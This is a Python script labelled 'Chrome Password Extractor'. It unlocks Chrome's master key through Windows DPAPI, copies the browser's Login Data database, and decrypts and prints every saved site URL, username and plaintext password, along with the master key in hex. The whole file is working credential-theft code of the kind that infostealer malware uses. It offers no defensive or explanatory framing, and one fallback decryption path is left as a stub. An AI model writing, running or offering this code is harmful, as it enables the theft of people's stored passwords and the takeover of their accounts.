import os
import sys
import json
import sqlite3
import ctypes
import ctypes.wintypes
import base64
import struct
from pathlib import Path

# Windows DPAPI structures
class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", ctypes.wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_char))
    ]

def dpapi_unprotect(encrypted_data):
    """Decrypt data using Windows DPAPI"""
    blob_in = DATA_BLOB()
    blob_out = DATA_BLOB()
    
    # Create input blob
    buf = ctypes.create_string_buffer(encrypted_data)
    blob_in.cbData = len(encrypted_data)
    blob_in.pbData = ctypes.cast(buf, ctypes.POINTER(ctypes.c_char))
    
    # Call CryptUnprotectData
    result = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in),
        None,
        None,
        None,
        None,
        0,
        ctypes.byref(blob_out)
    )
    
    if not result:
        raise Exception(f"CryptUnprotectData failed: {ctypes.GetLastError()}")
    
    # Extract decrypted data
    decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
    
    # Free memory
    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    
    return decrypted

def get_master_key():
    """Get and decrypt Chrome's master encryption key"""
    local_state_path = os.path.join(
        os.environ['LOCALAPPDATA'],
        'Google', 'Chrome', 'User Data', 'Local State'
    )
    
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    
    # Get encrypted key (base64 encoded)
    encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
    encrypted_key = base64.b64decode(encrypted_key_b64)
    
    # Remove DPAPI prefix (first 5 bytes)
    encrypted_key = encrypted_key[5:]
    
    # Decrypt using DPAPI
    decrypted_key = dpapi_unprotect(encrypted_key)
    
    return decrypted_key

def decrypt_password(encrypted_password, master_key):
    """Decrypt a Chrome password using AES-256-GCM"""
    try:
        # Check version prefix
        if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
            # AES-256-GCM encryption
            nonce = encrypted_password[3:15]  # 12 bytes nonce
            ciphertext = encrypted_password[15:-16]  # encrypted data
            tag = encrypted_password[-16:]  # 16 bytes authentication tag
            
            # Try to use cryptography library
            try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                aesgcm = AESGCM(master_key)
                decrypted = aesgcm.decrypt(nonce, ciphertext + tag, None)
                return decrypted.decode('utf-8')
            except ImportError:
                # Fallback: try using Windows CNG (Cryptography Next Generation)
                return decrypt_with_windows_cng(nonce, ciphertext, tag, master_key)
        else:
            # Legacy DPAPI encryption
            return dpapi_unprotect(encrypted_password).decode('utf-8', errors='replace')
    except Exception as e:
        return f"[Decryption failed: {str(e)}]"

def decrypt_with_windows_cng(nonce, ciphertext, tag, key):
    """Decrypt using Windows CNG API"""
    # This is a simplified version - full implementation would need CNG API calls
    return "[Windows CNG decryption not fully implemented]"

def main():
    print("=== Chrome Password Extractor ===\n")
    
    try:
        # Get master key
        master_key = get_master_key()
        print(f"[+] Master key obtained: {len(master_key)} bytes")
        print(f"    Key (hex): {master_key.hex()}\n")
    except Exception as e:
        print(f"[-] Failed to get master key: {e}")
        return
    
    # Connect to Login Data database
    db_path = os.path.join(
        os.environ['LOCALAPPDATA'],
        'Google', 'Chrome', 'User Data', 'Default', 'Login Data'
    )
    
    if not os.path.exists(db_path):
        print(f"[-] Database not found: {db_path}")
        return
    
    print(f"[+] Database found: {db_path}\n")
    
    # Copy database to avoid locking issues
    temp_db = os.path.join(os.environ['TEMP'], 'chrome_login_data.db')
    import shutil
    shutil.copy2(db_path, temp_db)
    
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    
    # Get all saved passwords
    cursor.execute("""
        SELECT origin_url, username_value, password_value, date_created 
        FROM logins 
        WHERE username_value != '' 
        ORDER BY date_created DESC
    """)
    
    rows = cursor.fetchall()
    print(f"[+] Found {len(rows)} saved credentials\n")
    print("-" * 80)
    
    # Group by website
    sites = {}
    for url, username, encrypted_password, date_created in rows:
        try:
            password = decrypt_password(encrypted_password, master_key)
        except Exception as e:
            password = f"[Error: {e}]"
        
        domain = url.split('/')[2] if '://' in url else url
        if domain not in sites:
            sites[domain] = []
        sites[domain].append({
            'url': url,
            'username': username,
            'password': password
        })
    
    # Print results
    for domain, creds in sorted(sites.items()):
        print(f"\n[{domain}]")
        for cred in creds:
            print(f"  URL: {cred['url']}")
            print(f"  Username: {cred['username']}")
            print(f"  Password: {cred['password']}")
            print()
    
    conn.close()
    
    # Clean up
    try:
        os.remove(temp_db)
    except:
        pass
    
    print("-" * 80)
    print(f"\n[+] Total sites with saved passwords: {len(sites)}")

if __name__ == '__main__':
    main()
